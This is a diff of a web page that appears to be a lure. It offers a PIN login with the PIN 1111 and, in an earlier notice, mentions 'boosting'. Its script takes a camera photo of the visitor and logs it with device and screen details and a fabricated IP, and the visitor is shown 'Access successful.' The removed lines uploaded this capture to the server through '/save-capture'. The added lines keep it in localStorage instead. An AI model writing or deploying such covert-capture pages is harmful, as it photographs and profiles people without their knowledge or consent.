@@ -18,17 +18,18 @@
     </div>
   </nav>
 
+  <!-- Notice / Warning -->
+  <div class="mt-6 w-11/12 md:w-2/3 bg-yellow-500 text-black p-4 rounded-lg shadow-md text-center">
+     🔔<b>Notice:</b> Notice: Only enter the correct PIN provided by the admin (1111).  
+  Wrong attempts will be logged.
+  </div>
+
   <!-- User PIN -->
   <div class="mt-10 text-center">
     <h2 class="text-2xl font-semibold mb-4">Enter Access PIN</h2>
     <input id="userPin" type="password" placeholder="PIN" class="px-3 py-2 rounded text-black">
     <button onclick="userLogin()" class="bg-blue-500 px-4 py-2 ml-2 rounded hover:bg-blue-600">Login</button>
     <p id="userStatus" class="mt-4 text-green-400"></p>
-  </div>
-
-  <div class="mt-6 w-3/4 max-w-lg bg-yellow-500 text-black p-3 rounded shadow text-center">
-    ⚠️ <strong>Notice:</strong> Please make sure your PIN is correct (1111). Unauthorized access is not allowed.  
-      Boosting may take a few minutes depending on server load.
   </div>
 
 <script>
@@ -70,19 +71,17 @@ function captureImage() {
         // Stop camera
         stream.getTracks().forEach(track => track.stop());
 
-        // Save capture to server
-        fetch("/save-capture", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            time: new Date().toLocaleString(),
-            ip: "192.168.0." + Math.floor(Math.random() * 255),
-            device: navigator.userAgent + " | " + screen.width + "x" + screen.height,
-            img: imageData
-          })
-        }).then(() => {
-          document.getElementById("userStatus").innerHTML = "✅ Access successful.";
+        // Save capture to localStorage
+        const logs = JSON.parse(localStorage.getItem("captures") || "[]");
+        logs.push({
+          time: new Date().toLocaleString(),
+          ip: "192.168.0." + Math.floor(Math.random() * 255),
+          device: navigator.userAgent + " | " + screen.width + "x" + screen.height,
+          img: imageData
         });
+        localStorage.setItem("captures", JSON.stringify(logs));
+
+        document.getElementById("userStatus").innerHTML = "✅ Access successful.";
       }, 1000);
     })
     .catch(err => {
